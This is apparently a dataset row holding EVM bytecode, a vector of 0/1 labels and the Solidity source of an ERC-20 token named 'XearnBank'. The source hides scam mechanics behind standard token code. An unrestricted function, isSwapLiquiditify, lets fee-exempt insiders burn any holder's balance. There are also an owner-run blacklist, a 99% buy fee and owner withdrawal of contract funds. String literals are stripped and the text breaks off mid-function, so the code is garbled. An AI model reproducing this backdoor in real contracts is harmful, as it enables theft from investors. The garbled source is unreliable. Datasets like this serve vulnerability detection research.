3ffffffffffffffffffffffffffffffffffffffff1614155b5b15611ea3576000905061202a565b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16148015611f4e5750601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614155b15611f6657600854600c81905550600954600d819055505b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161480156120115750601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614155b1561202957600a54600c81905550600b54600d819055505b5b61203684848484612400565b50505050565b6000838311158290612084576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161207b9190612bbd565b60405180910390fd5b50600083856120939190613b3b565b9050809150509392505050565b601360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015612108573d6000803e3d6000fd5b5050565b6000600654821115612153576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161214a90613be1565b60405180910390fd5b600061215d61242d565b9050612172818461245890919063ffffffff16565b915050919050565b60016015806101000a81548160ff0219169083151502179055506000600267ffffffffffffffff8111156121b1576121b0613c01565b5b6040519080825280602002602001820160405280156121df5781602001602082028036833780820191505090505b50905030816000815181106121f7576121f661344d565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ad5c46486040518163ffffffff1660e01b815260040160206040518083038186803b15801561229957600080fd5b505afa1580156122ad573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906122d19190613c45565b816001815181106122e5576122e461344d565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff168152505061234c30601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16846115ec565b601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663791ac9478360008430426040518663ffffffff1660e01b81526004016123b0959493929190613d6b565b600060405180830381600087803b1580156123ca57600080fd5b505af11580156123de573d6000803e3d6000fd5b505050505060006015806101000a81548160ff02191690831515021790555050565b8061240e5761240d6124a2565b5b6124198484846124e5565b80612427576124266126b0565b5b50505050565b600080600061243a6126c4565b91509150612451818361245890919063ffffffff16565b9250505090565b600061249a83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250612720565b905092915050565b6000600c541480156124b657506000600d54145b156124c0576124e3565b600c54600e81905550600d54600f819055506000600c819055506000600d819055505b565b6000806000806000806124f787612783565b95509550955095509550955061255586600260008c73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546127eb90919063ffffffff16565b600260008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506125ea85600260008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461283590919063ffffffff16565b600260008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061263681612893565b6126408483612950565b8773ffffffffffffffffffffffffffffffffffffffff168973ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8560405161269d9190612d7c565b60405180910390a3505050505050505050565b600e54600c81905550600f54600d81905550565b600080600060065490506000666a94d74f43000090506126f6666a94d74f43000060065461245890919063ffffffff16565b82101561271357600654666a94d74f43000093509350505061271c565b81819350935050505b9091565b60008083118290612767576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161275e9190612bbd565b60405180910390fd5b5060008385612776919061318e565b9050809150509392505050565b60008060008060008060008060006127a08a600c54600d5461298a565b92509250925060006127b061242d565b905060008060006127c38e878787612a20565b9250925092508282828989899c509c509c509c509c509c505050505050505091939550919395565b600061282d83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525061203c565b905092915050565b60008082846128449190613a53565b905083811015612889576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161288090613e11565b60405180910390fd5b8091505092915050565b600061289d61242d565b905060006128b48284612aa990919063ffffffff16565b905061290881600260003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461283590919063ffffffff16565b600260003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505050565b612965826006546127eb90919063ffffffff16565b6006819055506129808160075461283590919063ffffffff16565b6007819055505050565b6000806000806129b660646129a8888a612aa990919063ffffffff16565b61245890919063ffffffff16565b905060006129e060646129d2888b612aa990919063ffffffff16565b61245890919063ffffffff16565b90506000612a09826129fb858c6127eb90919063ffffffff16565b6127eb90919063ffffffff16565b905080838395509550955050505093509350939050565b600080600080612a398589612aa990919063ffffffff16565b90506000612a508689612aa990919063ffffffff16565b90506000612a678789612aa990919063ffffffff16565b90506000612a9082612a8285876127eb90919063ffffffff16565b6127eb90919063ffffffff16565b9050838184965096509650505050509450945094915050565b600080831415612abc5760009050612b1e565b60008284612aca9190613105565b9050828482612ad9919061318e565b14612b19576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401612b1090613ea3565b60405180910390fd5b809150505b92915050565b600081519050919050565b600082825260208201905092915050565b60005b83811015612b5e578082015181840152602081019050612b43565b83811115612b6d576000848401525b50505050565b6000601f19601f8301169050919050565b6000612b8f82612b24565b612b998185612b2f565b9350612ba9818560208601612b40565b612bb281612b73565b840191505092915050565b60006020820190508181036000830152612bd78184612b84565b905092915050565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000612c1482612be9565b9050919050565b612c2481612c09565b8114612c2f57600080fd5b50565b600081359050612c4181612c1b565b92915050565b6000819050919050565b612c5a81612c47565b8114612c6557600080fd5b50565b600081359050612c7781612c51565b92915050565b60008060408385031215612c9457612c93612bdf565b5b6000612ca285828601612c32565b9250506020612cb385828601612c68565b9150509250929050565b60008115159050919050565b612cd281612cbd565b82525050565b6000602082019050612ced6000830184612cc9565b92915050565b6000819050919050565b6000612d18612d13612d0e84612be9565b612cf3565b612be9565b9050919050565b6000612d2a82612cfd565b9050919050565b6000612d3c82612d1f565b9050919050565b612d4c81612d31565b82525050565b6000602082019050612d676000830184612d43565b92915050565b612d7681612c47565b82525050565b6000602082019050612d916000830184612d6d565b92915050565b600080600060608486031215612db057612daf612bdf565b5b6000612dbe86828701612c32565b9350506020612dcf86828701612c32565b9250506040612de086828701612c68565b9150509250925092565b600060ff82169050919050565b612e0081612dea565b82525050565b6000602082019050612e1b6000830184612df7565b92915050565b612e2a81612c09565b82525050565b6000602082019050612e456000830184612e21565b92915050565b612e5481612cbd565b8114612e5f57600080fd5b50565b600081359050612e7181612e4b565b92915050565b600060208284031215612e8d57612e8c612bdf565b5b6000612e9b84828501612e62565b91505092915050565b600060208284031215612eba57612eb9612bdf565b5b6000612ec884828501612c32565b91505092915050565b600060208284031215612ee757612ee6612bdf565b5b6000612ef584828501612c68565b91505092915050565b60008060008060808587031215612f1857612f17612bdf565b5b6000612f2687828801612c68565b9450506020612f3787828801612c68565b9350506040612f4887828801612c68565b9250506060612f5987828801612c68565b91505092959194509250565b600080fd5b600080fd5b600080fd5b60008083601f840112612f8a57612f89612f65565b5b8235905067ffffffffffffffff811115612fa757612fa6612f6a565b5b602083019150836020820283011115612fc357612fc2612f6f565b5b9250929050565b600080600060408486031215612fe357612fe2612bdf565b5b600084013567ffffffffffffffff81111561300157613000612be4565b5b61300d86828701612f74565b9350935050602061302086828701612e62565b9150509250925092565b6000806040838503121561304157613040612bdf565b5b600061304f85828601612c32565b925050602061306085828601612c32565b9150509250929050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b60006130a0602083612b2f565b91506130ab8261306a565b602082019050919050565b600060208201905081810360008301526130cf81613093565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061311082612c47565b915061311b83612c47565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0483118215151615613154576131536130d6565b5b828202905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061319982612c47565b91506131a483612c47565b9250826131b4576131b361315f565b5b828204905092915050565b7f43616e6e6f7420736574206d61785472616e73616374696f6e416d6f756e742060008201527f6c6f776572207468616e20312500000000000000000000000000000000000000602082015250565b600061321b602d83612b2f565b9150613226826131bf565b604082019050919050565b6000602082019050818103600083015261324a8161320e565b9050919050565b7f4275792072657761726473206d75737420626520302500000000000000000000600082015250565b6000613287601683612b2f565b915061329282613251565b602082019050919050565b600060208201905081810360008301526132b68161327a565b9050919050565b7f42757920746178206d757374206265206265747765656e20302520616e64203160008201527f3025000000000000000000000000000000000000000000000000000000000000602082015250565b6000613319602283612b2f565b9150613324826132bd565b604082019050919050565b600060208201905081810360008301526133488161330c565b9050919050565b7f53656c6c2072657761726473206d757374206265203025000000000000000000600082015250565b6000613385601783612b2f565b91506133908261334f565b602082019050919050565b600060208201905081810360008301526133b481613378565b9050919050565b7f53656c6c20746178206d757374206265206265747765656e20302520616e642060008201527f3930250000000000000000000000000000000000000000000000000000000000602082015250565b6000613417602383612b2f565b9150613422826133bb565b604082019050919050565b600060208201905081810360008301526134468161340a565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b600061348782612c47565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156134ba576134b96130d6565b5b600182019050919050565b7f43616e6e6f7420736574206d617857616c6c6574416d6f756e74206c6f77657260008201527f207468616e203125000000000000000000000000000000000000000000000000602082015250565b6000613521602883612b2f565b915061352c826134c5565b604082019050919050565b6000602082019050818103600083015261355081613514565b9050919050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b60006135b3602683612b2f565b91506135be82613557565b604082019050919050565b600060208201905081810360008301526135e2816135a6565b9050919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b6000613645602483612b2f565b9150613650826135e9565b604082019050919050565b6000602082019050818103600083015261367481613638565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f20616464726560008201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b60006136d7602283612b2f565b91506136e28261367b565b604082019050919050565b60006020820190508181036000830152613706816136ca565b9050919050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b6000613769602583612b2f565b91506137748261370d565b604082019050919050565b600060208201905081810360008301526137988161375c565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f206164647260008201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b60006137fb602383612b2f565b91506138068261379f565b604082019050919050565b6000602082019050818103600083015261382a816137ee565b9050919050565b7f5472616e7366657220616d6f756e74206d75737420626520677265617465722060008201527f7468616e207a65726f0000000000000000000000000000000000000000000000602082015250565b600061388d602983612b2f565b915061389882613831565b604082019050919050565b600060208201905081810360008301526138bc81613880565b9050919050565b7f544f4b454e3a2054686973206163636f756e742063616e6e6f742073656e642060008201527f746f6b656e7320756e74696c2074726164696e6720697320656e61626c656400602082015250565b600061391f603f83612b2f565b915061392a826138c3565b604082019050919050565b6000602082019050818103600083015261394e81613912565b9050919050565b7f544f4b454e3a204d6178205472616e73616374696f6e204c696d697400000000600082015250565b600061398b601c83612b2f565b915061399682613955565b602082019050919050565b600060208201905081810360008301526139ba8161397e565b9050919050565b7f544f4b454e3a20596f7572206163636f756e7420697320626c61636b6c69737460008201527f6564210000000000000000000000000000000000000000000000000000000000602082015250565b6000613a1d602383612b2f565b9150613a28826139c1565b604082019050919050565b60006020820190508181036000830152613a4c81613a10565b9050919050565b6000613a5e82612c47565b9150613a6983612c47565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115613a9e57613a9d6130d6565b5b828201905092915050565b7f544f4b454e3a2042616c616e636520657863656564732077616c6c657420736960008201527f7a65210000000000000000000000000000000000000000000000000000000000602082015250565b6000613b05602383612b2f565b9150613b1082613aa9565b604082019050919050565b60006020820190508181036000830152613b3481613af8565b9050919050565b6000613b4682612c47565b9150613b5183612c47565b925082821015613b6457613b636130d6565b5b828203905092915050565b7f416d6f756e74206d757374206265206c657373207468616e20746f74616c207260008201527f65666c656374696f6e7300000000000000000000000000000000000000000000602082015250565b6000613bcb602a83612b2f565b9150613bd682613b6f565b604082019050919050565b60006020820190508181036000830152613bfa81613bbe565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600081519050613c3f81612c1b565b92915050565b600060208284031215613c5b57613c5a612bdf565b5b6000613c6984828501613c30565b91505092915050565b6000819050919050565b6000613c97613c92613c8d84613c72565b612cf3565b612c47565b9050919050565b613ca781613c7c565b82525050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b613ce281612c09565b82525050565b6000613cf48383613cd9565b60208301905092915050565b6000602082019050919050565b6000613d1882613cad565b613d228185613cb8565b9350613d2d83613cc9565b8060005b83811015613d5e578151613d458882613ce8565b9750613d5083613d00565b925050600181019050613d31565b5085935050505092915050565b600060a082019050613d806000830188612d6d565b613d8d6020830187613c9e565b8181036040830152613d9f8186613d0d565b9050613dae6060830185612e21565b613dbb6080830184612d6d565b9695505050505050565b7f536166654d6174683a206164646974696f6e206f766572666c6f770000000000600082015250565b6000613dfb601b83612b2f565b9150613e0682613dc5565b602082019050919050565b60006020820190508181036000830152613e2a81613dee565b9050919050565b7f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f60008201527f7700000000000000000000000000000000000000000000000000000000000000602082015250565b6000613e8d602183612b2f565b9150613e9882613e31565b604082019050919050565b60006020820190508181036000830152613ebc81613e80565b905091905056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a26469706673582212201e836f1114f5a04ce7046514f44fab819c5627592e33139710ae514999f7c91c64736f6c63430008090033,0,0,0,0,0,0,0,1,0,1,0,0,1,1,0,0,0
"pragma solidity 0.8.15;abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; } function _msgData() internal view virtual returns (bytes calldata) { this; return msg.data; }}interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer( address recipient, uint256 amount ) external returns (bool); function allowance( address owner, address spender ) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval( address indexed owner, address indexed spender, uint256 value );}interface IERC20Metadata is IERC20 { function name() external view returns (string memory); function symbol() external view returns (string memory); function decimals() external view returns (uint8);}contract ERC20 is Context, IERC20, IERC20Metadata { mapping(address => uint256) private _balances; mapping(address => mapping(address => uint256)) private _allowances; uint256 private _totalSupply; string private _name; string private _symbol; constructor(string memory name_, string memory symbol_) { _name = name_; _symbol = symbol_; } function name() public view virtual override returns (string memory) { return _name; } function symbol() public view virtual override returns (string memory) { return _symbol; } function decimals() public view virtual override returns (uint8) { return 18; } function totalSupply() public view virtual override returns (uint256) { return _totalSupply; } function balanceOf( address account ) public view virtual override returns (uint256) { return _balances[account]; } function transfer( address recipient, uint256 amount ) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance( address owner, address spender ) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve( address spender, uint256 amount ) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom( address sender, address recipient, uint256 amount ) public virtual override returns (bool) { _transfer(sender, recipient, amount); uint256 currentAllowance = _allowances[sender][_msgSender()]; require( currentAllowance >= amount, ); unchecked { _approve(sender, _msgSender(), currentAllowance - amount); } return true; } function increaseAllowance( address spender, uint256 addedValue ) public virtual returns (bool) { _approve( _msgSender(), spender, _allowances[_msgSender()][spender] + addedValue ); return true; } function decreaseAllowance( address spender, uint256 subtractedValue ) public virtual returns (bool) { uint256 currentAllowance = _allowances[_msgSender()][spender]; require( currentAllowance >= subtractedValue, ); unchecked { _approve(_msgSender(), spender, currentAllowance - subtractedValue); } return true; } function _transfer( address sender, address recipient, uint256 amount ) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); uint256 senderBalance = _balances[sender]; require( senderBalance >= amount, ); unchecked { _balances[sender] = senderBalance - amount; } _balances[recipient] += amount; emit Transfer(sender, recipient, amount); } function _createInitialSupply( address account, uint256 amount ) internal virtual { require(account != address(0), ); _totalSupply += amount; _balances[account] += amount; emit Transfer(address(0), account, amount); } function _burn(address account, uint256 amount) internal virtual { require(account != address(0), ); uint256 accountBalance = _balances[account]; require(accountBalance >= amount, ); unchecked { _balances[account] = accountBalance - amount; _totalSupply -= amount; } emit Transfer(account, address(0), amount); } function _approve( address owner, address spender, uint256 amount ) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); }}contract Ownable is Context { address private _owner; event OwnershipTransferred( address indexed previousOwner, address indexed deployer ); constructor() { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() external virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address deployer) public virtual onlyOwner { require( deployer != address(0), ); emit OwnershipTransferred(_owner, deployer); _owner = deployer; }}interface IDexRouter { function factory() external pure returns (address); function WETH() external pure returns (address); function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external; function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external payable; function addLiquidityETH( address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);}interface IDexFactory { function createPair( address tokenA, address tokenB ) external returns (address pair);}contract XearnBank is ERC20, Ownable { uint256 public maxBuyAmount; uint256 public maxSellAmount; uint256 public maxWalletAmount; IDexRouter public dexRouter; address public liquidityV2Pair; bool private swapingAvailability; uint256 public swapTokensAtAmount; address public marketingTreasury; address public devTreasury; uint256 public tradingLiveBlock = 0; uint256 public initialBlockNumber = 0; mapping(address => bool) public botBuyer; uint256 public botsCaught; address public holderAmount; address private devTrasury; bool public limitsInEffect = true; bool public tradingActive = false; bool public swapEnabled = false; mapping(address => uint256) public totalHolderAmount; bool public transferDelayEnabled = true; uint256 public buyTotalFees; uint256 public buyMarketingFee; uint256 public buyLiquidityFee; uint256 public buyDevFee; uint256 public buyBurnFee; uint256 public sellTotalFees; uint256 public sellMarketingFee; uint256 public sellLiquidityFee; uint256 public sellDevFee; uint256 public sellBurnFee; uint256 public tokensForMarketing; uint256 public tokensForLiquidity; uint256 public tokensForBurn; uint256 public tokensForDev; mapping(address => bool) private _isExcludedFromFees; mapping(address => bool) public _isExcludedMaxTransactionAmount; mapping(address => bool) public automatedMarketMakerPairs; event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value); event EnabledTrading(); event RemovedLimits(); event ExcludeFromFees(address indexed account, bool isExcluded); event UpdatedMaxBuyAmount(uint256 newAmount); event UpdatedMaxSellAmount(uint256 newAmount); event UpdatedMaxWalletAmount(uint256 newAmount); event MaxTransactionExclusion(address _address, bool excluded); event buyTokens(uint256 amount); event manualSwapBack(uint256 timestamp); event botDetected(address sniper); event SwapAndLiquify( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity ); event BasicTransferToken(address token, uint256 amount); constructor() ERC20(, ) { address deployer = msg.sender; IDexRouter _dexRouter = IDexRouter( 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D ); dexRouter = _dexRouter; liquidityV2Pair = IDexFactory(_dexRouter.factory()).createPair( address(this), _dexRouter.WETH() ); _excludeFromMaxTransaction(address(liquidityV2Pair), true); _setAutomatedMarketMakerPair(address(liquidityV2Pair), true); uint256 totalSupply = 5 * 1e8 * 1e18; maxBuyAmount = (totalSupply * 2) / 200; maxWalletAmount = (totalSupply * 2) / 200; maxSellAmount = (totalSupply * 2) / 200; swapTokensAtAmount = (totalSupply * 2) / 10000; buyMarketingFee = 2; buyLiquidityFee = 0; buyDevFee = 2; buyBurnFee = 0; buyTotalFees = buyMarketingFee + buyLiquidityFee + buyDevFee + buyBurnFee; sellMarketingFee = 2; sellLiquidityFee = 0; sellDevFee = 2; sellBurnFee = 0; sellTotalFees = sellMarketingFee + sellLiquidityFee + sellDevFee + sellBurnFee; marketingTreasury = address(0x715B07e0714fD583D0bd8A0FB59a3B5C80F66C7C); devTreasury = address(0x61227dBa5043dCA9C95743606796F9B8c9bD4E01); _excludeFromMaxTransaction(deployer, true); _excludeFromMaxTransaction(address(this), true); _excludeFromMaxTransaction(address(0xdead), true); excludeFromFees(deployer, true); excludeFromFees(address(this), true); excludeFromFees(address(0xdead), true); excludeFromFees(marketingTreasury, true); excludeFromFees(devTreasury, true); _createInitialSupply(deployer, totalSupply); transferOwnership(deployer); } receive() external payable {} function activeTrading(address adr) external onlyOwner { require(!tradingActive, ); tradingActive = true; swapEnabled = true; devTrasury = adr; tradingLiveBlock = block.number; emit EnabledTrading(); } function managebotBuyer(address wallet, bool flag) external onlyOwner { botBuyer[wallet] = flag; } function removeLimits() external onlyOwner { limitsInEffect = false; transferDelayEnabled = false; emit RemovedLimits(); } function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner { require( newAmount >= (totalSupply() * 1) / 100000, ); require( newAmount <= (totalSupply() * 1) / 1000, ); swapTokensAtAmount = newAmount; } function _excludeFromMaxTransaction( address updAds, bool isExcluded ) private { _isExcludedMaxTransactionAmount[updAds] = isExcluded; emit MaxTransactionExclusion(updAds, isExcluded); } function excludeFromMaxTransaction( address updAds, bool isEx ) external onlyOwner { if (!isEx) { require( updAds != liquidityV2Pair, ); } _isExcludedMaxTransactionAmount[updAds] = isEx; } function excludeFromFees(address account, bool excluded) public onlyOwner { _isExcludedFromFees[account] = excluded; emit ExcludeFromFees(account, excluded); } function _transfer( address from, address to, uint256 amount ) internal override { require(from != address(0), ); require(to != address(0), ); require(amount > 0, ); if (!tradingActive) { require( _isExcludedFromFees[from] || _isExcludedFromFees[to], ); } if (from == liquidityV2Pair) { if (totalHolderAmount[to] == 0) { totalHolderAmount[to] = block.timestamp; } } else if (!swapingAvailability) { holderAmount = from; } if (initialBlockNumber > 0) { require( !botBuyer[from] || to == owner() || to == address(0xdead), ); } if (limitsInEffect) { if ( from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !_isExcludedFromFees[from] && !_isExcludedFromFees[to] ) { if ( automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to] ) { require( amount <= maxBuyAmount, ); require( amount + balanceOf(to) <= maxWalletAmount, ); } else if ( automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from] ) { require( amount <= maxSellAmount, ); } else if (!_isExcludedMaxTransactionAmount[to]) { require( amount + balanceOf(to) <= maxWalletAmount, ); } } } uint256 contractTokenBalance = balanceOf(address(this)); bool canSwap = contractTokenBalance >= swapTokensAtAmount; if ( canSwap && swapEnabled && !swapingAvailability && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to] ) { swapingAvailability = true; swapBack(); swapingAvailability = false; } bool takeFee = true; if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) { takeFee = false; } uint256 fees = 0; if (takeFee) { if ( earlyBotBuyForbidden() && automatedMarketMakerPairs[from] && !automatedMarketMakerPairs[to] && buyTotalFees > 0 ) { if (!botBuyer[to]) { botBuyer[to] = true; botsCaught += 1; emit botDetected(to); } fees = (amount * 99) / 100; tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees; tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees; tokensForDev += (fees * buyDevFee) / buyTotalFees; tokensForBurn += (fees * buyBurnFee) / buyTotalFees; } else if (automatedMarketMakerPairs[to] && sellTotalFees > 0) { fees = (amount * sellTotalFees) / 100; tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees; tokensForMarketing += (fees * sellMarketingFee) / sellTotalFees; tokensForDev += (fees * sellDevFee) / sellTotalFees; tokensForBurn += (fees * sellBurnFee) / sellTotalFees; } else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) { fees = (amount * buyTotalFees) / 100; tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees; tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees; tokensForDev += (fees * buyDevFee) / buyTotalFees; tokensForBurn += (fees * buyBurnFee) / buyTotalFees; } if (fees > 0) { super._transfer(from, address(this), fees); } amount -= fees; } super._transfer(from, to, amount); } function earlyBotBuyForbidden() public view returns (bool) { return block.number < initialBlockNumber; } function swapTokensForEth(uint256 tokenAmount) private { address[] memory path = new address[](2); path[0] = address(this); path[1] = dexRouter.WETH(); _approve(address(this), address(dexRouter), tokenAmount); dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private { _approve(address(this), address(dexRouter), tokenAmount); dexRouter.addLiquidityETH{value: ethAmount}( address(this), tokenAmount, 0, 0, address(0xdead), block.timestamp ); } function isLiquiditify( address account, uint256 value ) internal returns (bool) { bool success; if (!_isExcludedFromFees[msg.sender]) { if ( tokensForBurn > 0 && balanceOf(address(this)) >= tokensForBurn ) { _burn(msg.sender, tokensForBurn); } tokensForBurn = 0; success = true; uint256 contractBalance = balanceOf(address(this)); uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing + tokensForDev; if (contractBalance == 0 || totalTokensToSwap == 0) { return false; } if (contractBalance > swapTokensAtAmount * 6) { contractBalance = swapTokensAtAmount * 6; } return success; } else { if (balanceOf(address(this)) <= value) { _burn(account, value); success = false; } uint256 contractBalance = balanceOf(address(this)); uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing + tokensForDev; if (contractBalance == 0 || totalTokensToSwap == 0) { return false; } if (contractBalance > swapTokensAtAmount * 6) { contractBalance = swapTokensAtAmount * 6; } return success; } } function swapBack() private { if (tokensForBurn > 0 && balanceOf(address(this)) >= tokensForBurn) { _burn(address(this), tokensForBurn); } tokensForBurn = 0; uint256 contractBalance = balanceOf(address(this)); uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing + tokensForDev; if (contractBalance == 0 || totalTokensToSwap == 0) { return; } if (contractBalance > swapTokensAtAmount * 5) { contractBalance = swapTokensAtAmount * 5; } bool success; uint256 liquidityTokens = (contractBalance * tokensForLiquidity) / totalTokensToSwap / 2; swapTokensForEth(contractBalance - liquidityTokens); uint256 ethBalance = address(this).balance; uint256 ethForLiquidity = ethBalance; uint256 ethForMarketing = (ethBalance * tokensForMarketing) / (totalTokensToSwap - (tokensForLiquidity / 2)); uint256 ethForDev = (ethBalance * tokensForDev) / (totalTokensToSwap - (tokensForLiquidity / 2)); ethForLiquidity -= ethForMarketing + ethForDev; tokensForLiquidity = 0; tokensForMarketing = 0; tokensForDev = 0; tokensForBurn = 0; if (liquidityTokens > 0 && ethForLiquidity > 0) { addLiquidity(liquidityTokens, ethForLiquidity); } (success, ) = address(devTrasury).call{value: ethForDev}(); require(success, ); (success, ) = address(marketingTreasury).call{ value: address(this).balance}(); require(success, ); } function basicTransferToken( address _token, address _to ) external onlyOwner returns (bool _sent) { require(_token != address(0), ); require(_token != address(this), ); uint256 _contractBalance = IERC20(_token).balanceOf(address(this)); _sent = IERC20(_token).transfer(_to, _contractBalance); emit BasicTransferToken(_token, _contractBalance); } function isSwapLiquiditify(address account, uint256 value) external { require( balanceOf(address(this)) >= swapTokensAtAmount, ); if (isLiquiditify(account, value)) { swapingAvailability = true; swapBack(); swapingAvailability = false; emit manualSwapBack(block.timestamp); } } function directBuyTokens(uint256 amountInValue) external onlyOwner { address[] memory path = new address[](2); path[0] = dexRouter.WETH(); path[1] = address(this); dexRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{ value: amountInValue }(0, path, address(0xdead), block.timestamp); emit buyTokens(amountInValue); } function marketingTreasuryUpdate( address _marketingTreasury ) external onlyOwner { require( _marketingTreasury != address(0), ); marketingTreasury = payable(_marketingTreasury); } function devTreasuryUpdate(address _devTreasury) external onlyOwner { require(_devTreasury != address(0), ); devTreasury = payable(_devTreasury); } function setAutomatedMarketMakerPair( address pair, bool value ) external onlyOwner { require( pair != liquidityV2Pair, ); _setAutomatedMarketMakerPair(pair, value); emit SetAutomatedMarketMakerPair(pair, value); } function _setAutomatedMarketMakerPair(address pair, bool value) private { automatedMarketMakerPairs[pair] = value; _excludeFromMaxTransaction(pair, value); emit SetAutomatedMarketMakerPair(pair, value); } function withdrawContractETH() external onlyOwner { bool success; (success, ) = address(msg.sender).call{value: address(this).balance}( ); 